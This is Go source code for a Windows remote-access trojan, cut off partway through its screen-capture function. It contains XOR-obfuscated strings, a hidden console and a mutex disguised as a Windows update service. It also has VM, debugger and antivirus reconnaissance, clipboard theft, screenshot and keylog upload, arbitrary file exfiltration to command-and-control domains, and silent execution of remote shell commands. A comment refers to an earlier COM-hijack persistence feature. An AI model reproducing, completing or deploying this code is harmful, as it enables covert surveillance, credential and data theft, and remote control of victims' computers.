package main

import (
	"archive/zip"
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	mrand "math/rand"
	"net"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strings"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ================================================================
// XOR STRING DEOBFUSCATION
// ================================================================

var xorKey byte = 0x5A

var (
	encContentType = []byte{0x3B, 0x2A, 0x2A, 0x36, 0x33, 0x39, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x75, 0x30, 0x29, 0x35, 0x34}
	encAPIKey      = []byte{0x3B, 0x2A, 0x33, 0x31, 0x3F, 0x23}
	encAuth        = []byte{0x1B, 0x2F, 0x2E, 0x32, 0x35, 0x28, 0x33, 0x20, 0x3B, 0x2E, 0x33, 0x35, 0x34}
	encBearer      = []byte{0x18, 0x3F, 0x3B, 0x28, 0x3F, 0x28, 0x7A}
	encPrefer      = []byte{0x0A, 0x28, 0x3F, 0x3C, 0x3F, 0x28}
	encUpsert      = []byte{0x28, 0x3F, 0x29, 0x35, 0x36, 0x2F, 0x2E, 0x33, 0x35, 0x34, 0x67, 0x37, 0x3F, 0x28, 0x3D, 0x3F, 0x77, 0x3E, 0x2F, 0x2A, 0x36, 0x33, 0x39, 0x3B, 0x2E, 0x3F, 0x29}
)

func xd(data []byte) string {
	r := make([]byte, len(data))
	for i, b := range data {
		r[i] = b ^ xorKey
	}
	return string(r)
}

// ================================================================
// WINDOWS API
// ================================================================

var (
	user32   = windows.NewLazySystemDLL("user32.dll")
	gdi32    = windows.NewLazySystemDLL("gdi32.dll")
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
	advapi32 = windows.NewLazySystemDLL("advapi32.dll")
	shell32  = windows.NewLazySystemDLL("shell32.dll")

	pGetAsyncKeyState          = user32.NewProc("GetAsyncKeyState")
	pGetKeyboardState          = user32.NewProc("GetKeyboardState")
	pMapVirtualKeyW            = user32.NewProc("MapVirtualKeyW")
	pToUnicode                 = user32.NewProc("ToUnicode")
	pGetForegroundWindow       = user32.NewProc("GetForegroundWindow")
	pGetWindowTextW            = user32.NewProc("GetWindowTextW")
	pShowWindow                = user32.NewProc("ShowWindow")
	pGetSystemMetrics          = user32.NewProc("GetSystemMetrics")
	pGetDC                     = user32.NewProc("GetDC")
	pReleaseDC                 = user32.NewProc("ReleaseDC")
	pBlockInput                = user32.NewProc("BlockInput")
	pMessageBoxW               = user32.NewProc("MessageBoxW")
	pSystemParametersInfoW     = user32.NewProc("SystemParametersInfoW")
	pKeybdEvent                = user32.NewProc("keybd_event")
	pOpenClipboard             = user32.NewProc("OpenClipboard")
	pGetClipboardData          = user32.NewProc("GetClipboardData")
	pCloseClipboard            = user32.NewProc("CloseClipboard")
	pCreateCompatibleDC        = gdi32.NewProc("CreateCompatibleDC")
	pCreateCompatibleBitmap    = gdi32.NewProc("CreateCompatibleBitmap")
	pSelectObject              = gdi32.NewProc("SelectObject")
	pBitBlt                    = gdi32.NewProc("BitBlt")
	pGetDIBits                 = gdi32.NewProc("GetDIBits")
	pDeleteObject              = gdi32.NewProc("DeleteObject")
	pDeleteDC                  = gdi32.NewProc("DeleteDC")
	pGetConsoleWindow          = kernel32.NewProc("GetConsoleWindow")
	pIsDebuggerPresent         = kernel32.NewProc("IsDebuggerPresent")
	pCheckRemoteDebuggerPresent = kernel32.NewProc("CheckRemoteDebuggerPresent")
	pCreateToolhelp32Snapshot  = kernel32.NewProc("CreateToolhelp32Snapshot")
	pProcess32FirstW           = kernel32.NewProc("Process32FirstW")
	pProcess32NextW            = kernel32.NewProc("Process32NextW")
	pGetVolumeInformationW     = kernel32.NewProc("GetVolumeInformationW")
	pGlobalMemoryStatusEx      = kernel32.NewProc("GlobalMemoryStatusEx")
	pSetHandleInformation      = kernel32.NewProc("SetHandleInformation")
	pRegOpenKeyExW             = advapi32.NewProc("RegOpenKeyExW")
	pRegQueryValueExW          = advapi32.NewProc("RegQueryValueExW")
	pRegSetValueExW            = advapi32.NewProc("RegSetValueExW")
	pRegDeleteValueW           = advapi32.NewProc("RegDeleteValueW")
	pRegDeleteKeyW             = advapi32.NewProc("RegDeleteKeyW")
	pRegCloseKey               = advapi32.NewProc("RegCloseKey")
	pRegCreateKeyExW           = advapi32.NewProc("RegCreateKeyExW")
	pShellExecuteW             = shell32.NewProc("ShellExecuteW")
)

// ================================================================
// CONSTANTS
// ================================================================

const (
	SM_CXSCREEN        = 0
	SM_CYSCREEN        = 1
	SRCCOPY            = 0x00CC0020
	TH32CS_SNAPPROCESS = 0x00000002
	MAX_PATH           = 260
	KEY_READ           = 0x20019
	KEY_WRITE          = 0x20006
	REG_SZ             = 1
	HKCU               = 0x80000001
	HKLM               = 0x80000002
	CF_UNICODETEXT     = 13
	SPI_SETDESKWALLPAPER = 0x0014
	SPIF_UPDATEINIFILE = 0x01
	SPIF_SENDCHANGE    = 0x02
	VK_LWIN            = 0x5B
	KEYEVENTF_KEYUP    = 0x0002
	MB_OK              = 0x00000000
	MB_ICONWARNING     = 0x00000030

)

// ================================================================
// NATIVE STRUCTS
// ================================================================

type processEntry32 struct {
	Size            uint32
	Usage           uint32
	ProcessID       uint32
	DefaultHeapID   uintptr
	ModuleID        uint32
	Threads         uint32
	ParentProcessID uint32
	PriClassBase    int32
	Flags           uint32
	ExeFile         [MAX_PATH]uint16
}

type memoryStatusEx struct {
	Length               uint32
	MemoryLoad           uint32
	TotalPhys            uint64
	AvailPhys            uint64
	TotalPageFile        uint64
	AvailPageFile        uint64
	TotalVirtual         uint64
	AvailVirtual         uint64
	AvailExtendedVirtual uint64
}

type bitmapInfoHeader struct {
	Size          uint32
	Width         int32
	Height        int32
	Planes        uint16
	BitCount      uint16
	Compression   uint32
	SizeImage     uint32
	XPelsPerMeter int32
	YPelsPerMeter int32
	ClrUsed       uint32
	ClrImportant  uint32
}

// ================================================================
// CONFIG + C2 DATA TYPES
// ================================================================

type C2Domain struct {
	URL       string
	APIKey    string
	Priority  int
	LastSeen  time.Time
	FailCount int
}

type Config struct {
	Domains        []C2Domain
	MachineID      string
	MachineName    string
	UserName       string
	InstallPath    string
	BeaconInterval time.Duration
	JitterPercent  int
}

type ClientInfo struct {
	MachineID   string `json:"machine_id"`
	MachineName string `json:"machine_name"`
	UserName    string `json:"username"`
	OS          string `json:"os"`
	IP          string `json:"ip"`
	Admin       bool   `json:"is_admin"`
	LastSeen    string `json:"last_seen"`
	CreatedAt   string `json:"created_at"`
}

type Command struct {
	ID        string `json:"id"`
	MachineID string `json:"machine_id"`
	Command   string `json:"command"`
	Args      string `json:"args"`
	Status    string `json:"status"`
	Result    string `json:"result"`
	CreatedAt string `json:"created_at"`
}

type SysInfoRecord struct {
	MachineID string      `json:"machine_id"`
	InfoType  string      `json:"info_type"`
	Data      interface{} `json:"data"`
	CreatedAt string      `json:"created_at"`
}

type ScreenshotRecord struct {
	MachineID string `json:"machine_id"`
	ImageData string `json:"image_data"`
	CreatedAt string `json:"created_at"`
}

type KeylogRecord struct {
	MachineID   string `json:"machine_id"`
	Keystrokes  string `json:"keystrokes"`
	WindowTitle string `json:"window_title"`
	CreatedAt   string `json:"created_at"`
}

type FileRecord struct {
	MachineID   string `json:"machine_id"`
	Filename    string `json:"filename"`
	FilePath    string `json:"filepath"`
	Size        int64  `json:"size"`
	StoragePath string `json:"storage_path"`
	CreatedAt   string `json:"created_at"`
}

// ================================================================
// JOB MANAGER
// ================================================================

type JobManager struct {
	jobs map[string]context.CancelFunc
	mu   sync.RWMutex
}

func NewJobManager() *JobManager {
	return &JobManager{jobs: make(map[string]context.CancelFunc)}
}

func (jm *JobManager) Start(name string, fn func(ctx context.Context)) string {
	jm.mu.Lock()
	defer jm.mu.Unlock()
	if cancel, exists := jm.jobs[name]; exists {
		cancel()
	}
	ctx, cancel := context.WithCancel(context.Background())
	jm.jobs[name] = cancel
	go fn(ctx)
	return fmt.Sprintf("Job '%s' started", name)
}

func (jm *JobManager) Stop(name string) string {
	jm.mu.Lock()
	defer jm.mu.Unlock()
	if cancel, exists := jm.jobs[name]; exists {
		cancel()
		delete(jm.jobs, name)
		return fmt.Sprintf("Job '%s' stopped", name)
	}
	return fmt.Sprintf("Job '%s' not found", name)
}

func (jm *JobManager) StopAll() string {
	jm.mu.Lock()
	defer jm.mu.Unlock()
	for name, cancel := range jm.jobs {
		cancel()
		delete(jm.jobs, name)
	}
	return "All jobs stopped"
}

func (jm *JobManager) List() []string {
	jm.mu.RLock()
	defer jm.mu.RUnlock()
	var names []string
	for name := range jm.jobs {
		names = append(names, name)
	}
	return names
}

// ================================================================
// C2 CLIENT
// ================================================================

type C2Client struct {
	config        *Config
	httpClient    *http.Client
	currentDomain *C2Domain
	mu            sync.RWMutex
	sessionToken  string
}

func NewC2Client(config *Config) *C2Client {
	c := &C2Client{
		config: config,
		httpClient: &http.Client{
			Timeout: 30 * time.Second,
			Transport: &http.Transport{
				MaxIdleConns:        10,
				IdleConnTimeout:     90 * time.Second,
				TLSHandshakeTimeout: 10 * time.Second,
			},
		},
	}
	h := sha256.New()
	h.Write([]byte(config.MachineID))
	h.Write([]byte(time.Now().Format("2006-01-02")))
	c.sessionToken = hex.EncodeToString(h.Sum(nil))[:32]
	c.selectBestDomain()
	return c
}

func (c *C2Client) selectBestDomain() {
	c.mu.Lock()
	defer c.mu.Unlock()
	var best *C2Domain
	for i := range c.config.Domains {
		d := &c.config.Domains[i]
		if d.FailCount > 3 && time.Since(d.LastSeen) < 5*time.Minute {
			continue
		}
		if best == nil || d.Priority > best.Priority {
			best = d
		}
	}
	if best != nil {
		c.currentDomain = best
	}
}

func (c *C2Client) markSuccess() {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.currentDomain != nil {
		c.currentDomain.LastSeen = time.Now()
		c.currentDomain.FailCount = 0
	}
}

func (c *C2Client) markFailure() {
	c.mu.Lock()
	if c.currentDomain != nil {
		c.currentDomain.FailCount++
	}
	c.mu.Unlock()
	c.selectBestDomain()
}

func (c *C2Client) request(method, endpoint string, body interface{}, extra map[string]string) ([]byte, error) {
	var lastErr error
	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0",
	}
	for attempt := 0; attempt < len(c.config.Domains); attempt++ {
		c.mu.RLock()
		domain := c.currentDomain
		c.mu.RUnlock()
		if domain == nil {
			c.selectBestDomain()
			c.mu.RLock()
			domain = c.currentDomain
			c.mu.RUnlock()
			if domain == nil {
				return nil, fmt.Errorf("no C2 domains available")
			}
		}
		var reqBody io.Reader
		if body != nil {
			j, err := json.Marshal(body)
			if err != nil {
				return nil, err
			}
			reqBody = bytes.NewReader(j)
		}
		req, err := http.NewRequest(method, domain.URL+endpoint, reqBody)
		if err != nil {
			lastErr = err
			c.markFailure()
			continue
		}
		if body != nil {
			req.Header.Set("Content-Type", xd(encContentType))
		}
		req.Header.Set(xd(encAPIKey), domain.APIKey)
		req.Header.Set(xd(encAuth), xd(encBearer)+domain.APIKey)
		req.Header.Set("X-Machine-ID", c.config.MachineID)
		req.Header.Set("User-Agent", agents[mrand.Intn(len(agents))])
		for k, v := range extra {
			req.Header.Set(k, v)
		}
		resp, err := c.httpClient.Do(req)
		if err != nil {
			lastErr = err
			c.markFailure()
			continue
		}
		respBody, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode == 429 {
			time.Sleep(5 * time.Second)
			continue
		}
		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			c.markSuccess()
			return respBody, nil
		}
		lastErr = fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(respBody))
		c.markFailure()
	}
	return nil, fmt.Errorf("all domains failed: %v", lastErr)
}

func (c *C2Client) Register() error {
	info := ClientInfo{
		MachineID: c.config.MachineID, MachineName: c.config.MachineName,
		UserName: c.config.UserName, OS: getWindowsVersion(),
		IP: c.getPublicIP(), Admin: isAdmin(),
		LastSeen: now(), CreatedAt: now(),
	}
	_, err := c.request("POST", "/rest/v1/clients?on_conflict=machine_id", info, map[string]string{xd(encPrefer): xd(encUpsert)})
	return err
}

func (c *C2Client) Heartbeat() error {
	d := map[string]interface{}{"last_seen": now(), "ip": c.getPublicIP(), "is_admin": isAdmin()}
	_, err := c.request("PATCH", "/rest/v1/clients?machine_id=eq."+c.config.MachineID, d, nil)
	return err
}

func (c *C2Client) GetPendingCommands() ([]Command, error) {
	ep := fmt.Sprintf("/rest/v1/commands?or=(machine_id.eq.%s,machine_id.eq.*)&status=eq.pending&order=created_at.asc", c.config.MachineID)
	data, err := c.request("GET", ep, nil, nil)
	if err != nil {
		return nil, err
	}
	var cmds []Command
	json.Unmarshal(data, &cmds)
	return cmds, nil
}

func (c *C2Client) UpdateCommand(id, status, result string) {
	if len(result) > 50000 {
		result = result[:50000] + "\n...[truncated]"
	}
	d := map[string]interface{}{"status": status, "result": result, "executed_at": now()}
	c.request("PATCH", "/rest/v1/commands?id=eq."+id, d, nil)
}

func (c *C2Client) SendSysInfo(infoType string, data interface{}) error {
	r := SysInfoRecord{MachineID: c.config.MachineID, InfoType: infoType, Data: data, CreatedAt: now()}
	_, err := c.request("POST", "/rest/v1/system_info", r, nil)
	return err
}

func (c *C2Client) SendScreenshot(img []byte) error {
	c.mu.RLock()
	domain := c.currentDomain
	c.mu.RUnlock()
	if domain == nil {
		return fmt.Errorf("no C2 domain available")
	}

	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	}

	filename := fmt.Sprintf("screenshot_%d.bmp", time.Now().UnixMilli())
	req, err := http.NewRequest("POST", domain.URL+"/functions/v1/file-upload", bytes.NewReader(img))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set(xd(encAPIKey), domain.APIKey)
	req.Header.Set(xd(encAuth), xd(encBearer)+domain.APIKey)
	req.Header.Set("X-Machine-ID", c.config.MachineID)
	req.Header.Set("X-Filename", filename)
	req.Header.Set("X-Filepath", "")
	req.Header.Set("X-Type", "screenshot")
	req.Header.Set("User-Agent", agents[mrand.Intn(len(agents))])

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body)

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("screenshot upload HTTP %d", resp.StatusCode)
	}
	return nil
}

func (c *C2Client) SendKeylog(keys, title string) error {
	r := KeylogRecord{MachineID: c.config.MachineID, Keystrokes: keys, WindowTitle: title, CreatedAt: now()}
	_, err := c.request("POST", "/rest/v1/keylogs", r, nil)
	return err
}

func (c *C2Client) SendFile(filePath string) error {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}
	filename := filepath.Base(filePath)

	c.mu.RLock()
	domain := c.currentDomain
	c.mu.RUnlock()
	if domain == nil {
		return fmt.Errorf("no C2 domain available")
	}

	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	}

	req, err := http.NewRequest("POST", domain.URL+"/functions/v1/file-upload", bytes.NewReader(data))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set(xd(encAPIKey), domain.APIKey)
	req.Header.Set(xd(encAuth), xd(encBearer)+domain.APIKey)
	req.Header.Set("X-Machine-ID", c.config.MachineID)
	req.Header.Set("X-Filename", filename)
	req.Header.Set("X-Filepath", filePath)
	req.Header.Set("User-Agent", agents[mrand.Intn(len(agents))])

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body)

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("file upload HTTP %d", resp.StatusCode)
	}
	return nil
}

// SendFileChunked is kept as alias for backward compat
func (c *C2Client) SendFileChunked(filePath string) error {
	return c.SendFile(filePath)
}

func (c *C2Client) getPublicIP() string {
	for _, svc := range []string{"https://api.ipify.org", "https://icanhazip.com", "https://ifconfig.me/ip"} {
		resp, err := c.httpClient.Get(svc)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		return strings.TrimSpace(string(body))
	}
	return "unknown"
}

func now() string { return time.Now().UTC().Format(time.RFC3339) }

// ================================================================
// SINGLE INSTANCE + HIDE CONSOLE
// ================================================================

var singleInstanceMutex windows.Handle

func createSingleInstance() bool {
	name, _ := windows.UTF16PtrFromString("Global\\WinUpdateSvcMtx")
	h, err := windows.CreateMutex(nil, false, name)
	if err != nil {
		return false
	}
	if windows.GetLastError() == windows.ERROR_ALREADY_EXISTS {
		windows.CloseHandle(h)
		return false
	}
	singleInstanceMutex = h
	return true
}

func releaseSingleInstance() {
	if singleInstanceMutex != 0 {
		windows.ReleaseMutex(singleInstanceMutex)
		windows.CloseHandle(singleInstanceMutex)
		singleInstanceMutex = 0
	}
}

func hideConsole() {
	hwnd, _, _ := pGetConsoleWindow.Call()
	if hwnd != 0 {
		pShowWindow.Call(hwnd, 0)
	}
}

// ================================================================
// MACHINE ID + REGISTRY + ADMIN CHECK
// ================================================================

func generateMachineID() string {
	var fp strings.Builder
	cDrive, _ := windows.UTF16PtrFromString("C:\\")
	var volName, fsName [256]uint16
	var serial, maxComp, fsFlags uint32
	pGetVolumeInformationW.Call(uintptr(unsafe.Pointer(cDrive)), uintptr(unsafe.Pointer(&volName[0])), 256, uintptr(unsafe.Pointer(&serial)), uintptr(unsafe.Pointer(&maxComp)), uintptr(unsafe.Pointer(&fsFlags)), uintptr(unsafe.Pointer(&fsName[0])), 256)
	fp.WriteString(fmt.Sprintf("%08X", serial))
	ifaces, _ := net.Interfaces()
	for _, iface := range ifaces {
		if len(iface.HardwareAddr) == 6 {
			mac := iface.HardwareAddr.String()
			vmP := []string{"00:0C:29", "00:50:56", "08:00:27", "00:05:69", "00:1C:14"}
			isVm := false
			for _, p := range vmP {
				if strings.HasPrefix(mac, p) {
					isVm = true
				}
			}
			if !isVm {
				fp.WriteString(mac)
				break
			}
		}
	}
	var cn [256]uint16
	sz := uint32(256)
	windows.GetComputerName(&cn[0], &sz)
	fp.WriteString(windows.UTF16PtrToString(&cn[0]))
	fp.WriteString(regRead(HKLM, `HARDWARE\DESCRIPTION\System\BIOS`, "BaseBoardSerialNumber"))
	hash := sha256.Sum256([]byte(fp.String()))
	return hex.EncodeToString(hash[:16])
}

func regRead(root uintptr, keyPath, valueName string) string {
	kp, _ := windows.UTF16PtrFromString(keyPath)
	var hKey uintptr
	ret, _, _ := pRegOpenKeyExW.Call(root, uintptr(unsafe.Pointer(kp)), 0, uintptr(uint32(KEY_READ)), uintptr(unsafe.Pointer(&hKey)))
	if ret != 0 {
		return ""
	}
	defer pRegCloseKey.Call(hKey)
	vn, _ := windows.UTF16PtrFromString(valueName)
	var dt uint32
	var data [1024]uint16
	size := uint32(2048)
	pRegQueryValueExW.Call(hKey, uintptr(unsafe.Pointer(vn)), 0, uintptr(unsafe.Pointer(&dt)), uintptr(unsafe.Pointer(&data[0])), uintptr(unsafe.Pointer(&size)))
	if size == 0 {
		return ""
	}
	return windows.UTF16PtrToString(&data[0])
}

func regWrite(root uintptr, keyPath, valueName, value string) error {
	kp, _ := windows.UTF16PtrFromString(keyPath)
	var hKey uintptr
	var disp uint32
	ret, _, _ := pRegCreateKeyExW.Call(root, uintptr(unsafe.Pointer(kp)), 0, 0, 0, uintptr(uint32(KEY_WRITE)), 0, uintptr(unsafe.Pointer(&hKey)), uintptr(unsafe.Pointer(&disp)))
	if ret != 0 {
		return fmt.Errorf("RegCreateKeyExW: %d", ret)
	}
	defer pRegCloseKey.Call(hKey)
	vn, _ := windows.UTF16PtrFromString(valueName)
	vd, _ := windows.UTF16FromString(value)
	ret, _, _ = pRegSetValueExW.Call(hKey, uintptr(unsafe.Pointer(vn)), 0, uintptr(uint32(REG_SZ)), uintptr(unsafe.Pointer(&vd[0])), uintptr(len(vd)*2))
	if ret != 0 {
		return fmt.Errorf("RegSetValueExW: %d", ret)
	}
	return nil
}

func regDelete(root uintptr, keyPath, valueName string) {
	kp, _ := windows.UTF16PtrFromString(keyPath)
	var hKey uintptr
	ret, _, _ := pRegOpenKeyExW.Call(root, uintptr(unsafe.Pointer(kp)), 0, uintptr(uint32(KEY_WRITE)), uintptr(unsafe.Pointer(&hKey)))
	if ret != 0 {
		return
	}
	defer pRegCloseKey.Call(hKey)
	vn, _ := windows.UTF16PtrFromString(valueName)
	pRegDeleteValueW.Call(hKey, uintptr(unsafe.Pointer(vn)))
}

func regDeleteKey(root uintptr, keyPath string) {
	kp, _ := windows.UTF16PtrFromString(keyPath)
	pRegDeleteKeyW.Call(root, uintptr(unsafe.Pointer(kp)))
}

// cleanupStaleCOMHijack removes leftover COM hijack registry entries from the
// removed DLL sideload feature. The hijack targeted MMDeviceEnumerator which
// most apps load for audio — stale entries pointing to a deleted DLL cause
// those apps to crash on startup.
func cleanupStaleCOMHijack() {
	const comCLSID = `{BCDE0395-E52F-467C-8E3D-C4579291692E}`
	comInproc := `Software\Classes\CLSID\` + comCLSID + `\InprocServer32`
	comParent := `Software\Classes\CLSID\` + comCLSID

	// Check if our hijack is present (HKCU override of system CLSID)
	val := regRead(HKCU, comInproc, "")
	if val == "" {
		return // no hijack present
	}

	// Remove values then delete the subkey tree (leaf-first)
	regDelete(HKCU, comInproc, "")
	regDelete(HKCU, comInproc, "ThreadingModel")
	regDeleteKey(HKCU, comInproc)
	regDeleteKey(HKCU, comParent)

	// Also remove sideloaded DLL file if it still exists
	appdata := os.Getenv("APPDATA")
	if appdata != "" {
		// Walk common drop locations used by the old sideload code
		filepath.Walk(appdata, func(path string, info os.FileInfo, err error) error {
			if err != nil || info == nil || info.IsDir() {
				return nil
			}
			if strings.EqualFold(info.Name(), "ShellServiceHost.dll") {
				os.Remove(path)
			}
			return nil
		})
	}
}

func isAdmin() bool {
	var token windows.Token
	proc, _ := windows.GetCurrentProcess()
	err := windows.OpenProcessToken(proc, windows.TOKEN_QUERY, &token)
	if err != nil {
		return false
	}
	defer token.Close()
	return token.IsElevated()
}

// ================================================================
// SHELL EXECUTION (CreateProcess + Pipes)
// ================================================================

func shellExec(command string) (string, error) {
	comspec := os.Getenv("COMSPEC")
	if comspec == "" {
		comspec = `C:\Windows\System32\cmd.exe`
	}
	cmdLine := fmt.Sprintf(`"%s" /c %s`, comspec, command)
	sa := windows.SecurityAttributes{Length: uint32(unsafe.Sizeof(windows.SecurityAttributes{})), InheritHandle: 1}
	var readPipe, writePipe windows.Handle
	err := windows.CreatePipe(&readPipe, &writePipe, &sa, 0)
	if err != nil {
		return "", err
	}
	defer windows.CloseHandle(readPipe)
	pSetHandleInformation.Call(uintptr(readPipe), 1, 0)
	si := windows.StartupInfo{
		Cb:         uint32(unsafe.Sizeof(windows.StartupInfo{})),
		Flags:      windows.STARTF_USESTDHANDLES | windows.STARTF_USESHOWWINDOW,
		ShowWindow: 0,
		StdOutput:  writePipe,
		StdErr:     writePipe,
	}
	var pi windows.ProcessInformation
	cmdUTF16, _ := windows.UTF16PtrFromString(cmdLine)
	err = windows.CreateProcess(nil, cmdUTF16, nil, nil, true, windows.CREATE_NO_WINDOW, nil, nil, &si, &pi)
	if err != nil {
		windows.CloseHandle(writePipe)
		return "", err
	}
	windows.CloseHandle(writePipe)
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)
	var output bytes.Buffer
	buf := make([]byte, 4096)
	for {
		var n uint32
		err := windows.ReadFile(readPipe, buf, &n, nil)
		if err != nil || n == 0 {
			break
		}
		output.Write(buf[:n])
	}
	windows.WaitForSingleObject(pi.Process, windows.INFINITE)
	return output.String(), nil
}

// ================================================================
// SYSTEM INFORMATION
// ================================================================

func getWindowsVersion() string {
	p := regRead(HKLM, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, "ProductName")
	d := regRead(HKLM, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, "DisplayVersion")
	b := regRead(HKLM, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, "CurrentBuildNumber")
	return fmt.Sprintf("%s %s (Build %s)", p, d, b)
}

func getFullSystemInfo(c2 *C2Client) map[string]interface{} {
	u, _ := user.Current()
	hostname, _ := os.Hostname()
	cpuName := regRead(HKLM, `HARDWARE\DESCRIPTION\System\CentralProcessor\0`, "ProcessorNameString")
	var ms memoryStatusEx
	ms.Length = uint32(unsafe.Sizeof(ms))
	pGlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&ms)))
	w, _, _ := pGetSystemMetrics.Call(uintptr(SM_CXSCREEN))
	h, _, _ := pGetSystemMetrics.Call(uintptr(SM_CYSCREEN))

	// Network interfaces
	ifaces, _ := net.Interfaces()
	var netList []map[string]string
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, _ := iface.Addrs()
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && ipnet.IP.To4() != nil {
				netList = append(netList, map[string]string{"name": iface.Name, "mac": iface.HardwareAddr.String(), "ip": ipnet.IP.String()})
			}
		}
	}

	// Installed software
	software, _ := shellExec(`reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /v DisplayName 2>nul | findstr /i "DisplayName"`)

	// Running processes summary
	procs := getProcessList()
	var procNames []string
	for _, p := range procs {
		procNames = append(procNames, p["name"].(string))
	}

	// AV info
	av, _ := shellExec(`wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName /format:list 2>nul`)

	return map[string]interface{}{
		"computer_name":   hostname,
		"username":        u.Username,
		"os":              getWindowsVersion(),
		"arch":            runtime.GOARCH,
		"is_admin":        isAdmin(),
		"cpu":             cpuName,
		"total_ram_mb":    ms.TotalPhys / (1024 * 1024),
		"avail_ram_mb":    ms.AvailPhys / (1024 * 1024),
		"ram_load_pct":    ms.MemoryLoad,
		"screen":          fmt.Sprintf("%dx%d", w, h),
		"public_ip":       c2.getPublicIP(),
		"network":         netList,
		"antivirus":       strings.TrimSpace(av),
		"installed_sw":    software,
		"running_procs":   procNames,
		"pid":             os.Getpid(),
		"is_vm":           detectVM(),
		"is_debugged":     detectDebugger(),
		"analysis_tools":  detectAnalysisTools(),
		"clipboard":       getClipboard(),
	}
}

// ================================================================
// PROCESS LISTING
// ================================================================

func getProcessList() []map[string]interface{} {
	var procs []map[string]interface{}
	snap, _, _ := pCreateToolhelp32Snapshot.Call(TH32CS_SNAPPROCESS, 0)
	if snap == ^uintptr(0) {
		return procs
	}
	defer windows.CloseHandle(windows.Handle(snap))
	var entry processEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	ret, _, _ := pProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return procs
	}
	for {
		name := windows.UTF16PtrToString(&entry.ExeFile[0])
		procs = append(procs, map[string]interface{}{"pid": entry.ProcessID, "ppid": entry.ParentProcessID, "name": name})
		entry.Size = uint32(unsafe.Sizeof(entry))
		ret, _, _ = pProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}
	return procs
}

// ================================================================
// CLIPBOARD
// ================================================================

func getClipboard() string {
	ret, _, _ := pOpenClipboard.Call(0)
	if ret == 0 {
		return ""
	}
	defer pCloseClipboard.Call()
	h, _, _ := pGetClipboardData.Call(CF_UNICODETEXT)
	if h == 0 {
		return ""
	}
	ptr := (*uint16)(unsafe.Pointer(h))
	return windows.UTF16PtrToString(ptr)
}

// ================================================================
// SCREEN CAPTURE (GDI BitBlt)
// ================================================================

func captureScreen() ([]byte, error) {
	wRet, _, _ := pGetSystemMetrics.Call(uintptr(SM_CXSCREEN))
	hRet, _, _ := pGetSystemMetrics.Call(uintptr(SM_CYSCREEN))
	width := int(wRet)
	height := int(hRet)
	if width == 0 || height == 0 {
		return nil, fmt.Errorf("zero screen dims")
	}
	hdcScreen, _, _ := pGetDC.Call(0)
	if hdcScreen == 0 {
		return nil, fmt.Errorf("GetDC failed")
	}
	defer pReleaseDC.Call(0, hdcScreen)
	hdcMem, _, _ := pCreateCompatibleDC.Call(hdcScreen)
	if hdcMem == 0 {
		return nil, fmt.Errorf("CreateCompatibleDC failed")
	}
	defer pDeleteDC.Call(hdcMem)
	hBitmap, _, _ := pCreateCompatibleBitmap.Call(hdcScreen, uintptr(width), uintptr(height))
	if hBitmap == 0 {
		return nil, fmt.Errorf("CreateCompatibleBitmap failed")
	}
	defer pDeleteObject.Call(hBitmap)
	pSelectObject.Call(hdcMem, hBitmap)
	ret, _, _ := pBitBlt.Call(hdcMem, 0, 0, uintptr(width), uintptr(height), hdcScreen, 0, 0, SRCCOPY)
	if ret == 0 {
		return nil, fmt.Errorf("BitBlt failed")
	}
	bmi := bitmapInfoHeader{Size: 40, Width: int32(width), Height: int32(height), Planes: 1, BitCount: 24}
	rowSize := (uint32(width)*3 + 3) & ^uint32(3)
	imageSize := rowSize * uint32(height)
